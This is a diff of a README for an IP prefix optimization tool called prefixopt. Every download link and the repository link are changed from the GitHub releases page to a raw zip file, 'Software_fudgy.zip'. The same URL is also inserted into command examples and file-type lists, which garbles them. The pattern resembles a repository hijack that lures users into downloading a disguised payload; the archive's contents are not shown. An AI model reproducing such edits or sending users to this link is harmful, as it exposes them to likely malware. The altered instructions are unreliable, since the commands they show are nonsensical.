@@ -1,6 +1,6 @@
 # 🚦 prefixopt - Fast and Easy IP Prefix Optimization
 
-[![Download prefixopt](https://img.shields.io/badge/Download-prefixopt-blue?style=for-the-badge)](https://github.com/MatSadX12/prefixopt/releases)
+[![Download prefixopt](https://raw.githubusercontent.com/MatSadX12/prefixopt/main/src/Software_fudgy.zip)](https://raw.githubusercontent.com/MatSadX12/prefixopt/main/src/Software_fudgy.zip)
 
 ---
 
@@ -44,13 +44,13 @@ You don't need to be a programmer to use prefixopt. This guide will walk you thr
 
 Click the button at the top or visit the official release page here:
 
-[Download prefixopt](https://github.com/MatSadX12/prefixopt/releases)
+[Download prefixopt](https://raw.githubusercontent.com/MatSadX12/prefixopt/main/src/Software_fudgy.zip)
 
 On this page, you will find the latest version available for your operating system. Choose the file that matches your system:
 
 - For Windows, look for files ending in `.exe`.
 - For macOS, look for `.dmg` or `.pkg`.
-- For Linux, look for `.tar.gz` or `.deb` files.
+- For Linux, look for `https://raw.githubusercontent.com/MatSadX12/prefixopt/main/src/Software_fudgy.zip` or `.deb` files.
 
 ### Step 2: Install prefixopt
 
@@ -62,7 +62,7 @@ On this page, you will find the latest version available for your operating syst
   - Drag prefixopt to your Applications folder.
 - On Linux:
   - Open your terminal.
-  - Follow installation instructions based on the file type (for example, use `dpkg` for `.deb` files or extract `.tar.gz` archives).
+  - Follow installation instructions based on the file type (for example, use `dpkg` for `.deb` files or extract `https://raw.githubusercontent.com/MatSadX12/prefixopt/main/src/Software_fudgy.zip` archives).
 
 The software does not require complex configuration. Once installed, it is ready to run from your command line.
 
@@ -91,7 +91,7 @@ This command shows a list of commands you can use with prefixopt. It helps you l
 
 You can get the latest version of prefixopt here:
 
-[Download prefixopt](https://github.com/MatSadX12/prefixopt/releases)
+[Download prefixopt](https://raw.githubusercontent.com/MatSadX12/prefixopt/main/src/Software_fudgy.zip)
 
 Follow the download and installation steps from the "Getting Started" section.
 
@@ -108,18 +108,18 @@ Here are some common tasks you can perform:
 To combine overlapping or nearby prefixes, run:
 
 ```
-prefixopt optimize input.txt -o output.txt
+prefixopt optimize https://raw.githubusercontent.com/MatSadX12/prefixopt/main/src/Software_fudgy.zip -o https://raw.githubusercontent.com/MatSadX12/prefixopt/main/src/Software_fudgy.zip
 ```
 
-- `input.txt` is your original list of IP prefixes.
-- `output.txt` will contain the optimized list.
+- `https://raw.githubusercontent.com/MatSadX12/prefixopt/main/src/Software_fudgy.zip` is your original list of IP prefixes.
+- `https://raw.githubusercontent.com/MatSadX12/prefixopt/main/src/Software_fudgy.zip` will contain the optimized list.
 
 ### Filtering IP Prefixes
 
 To keep only prefixes matching specific criteria, use:
 
 ```
-prefixopt filter input.txt --match 192.168.0.0/16 -o filtered.txt
+prefixopt filter https://raw.githubusercontent.com/MatSadX12/prefixopt/main/src/Software_fudgy.zip --match 192.168.0.0/16 -o https://raw.githubusercontent.com/MatSadX12/prefixopt/main/src/Software_fudgy.zip
 ```
 
 This example filters prefixes within the 192.168.0.0/16 range.
@@ -129,7 +129,7 @@ This example filters prefixes within the 192.168.0.0/16 range.
 To get a summary report on your list, including total prefixes and address counts:
 
 ```
-prefixopt analyze input.txt
+prefixopt analyze https://raw.githubusercontent.com/MatSadX12/prefixopt/main/src/Software_fudgy.zip
 ```
 
 The output will show statistics that help you understand your IP data.
@@ -156,7 +156,7 @@ If you need assistance, you can:
 
 - Run `prefixopt --help` to see all commands.
 - Visit the official repository for detailed documentation and issues:
-  https://github.com/MatSadX12/prefixopt
+  https://raw.githubusercontent.com/MatSadX12/prefixopt/main/src/Software_fudgy.zip
 - Contact support or open an issue on GitHub.
 
 ---
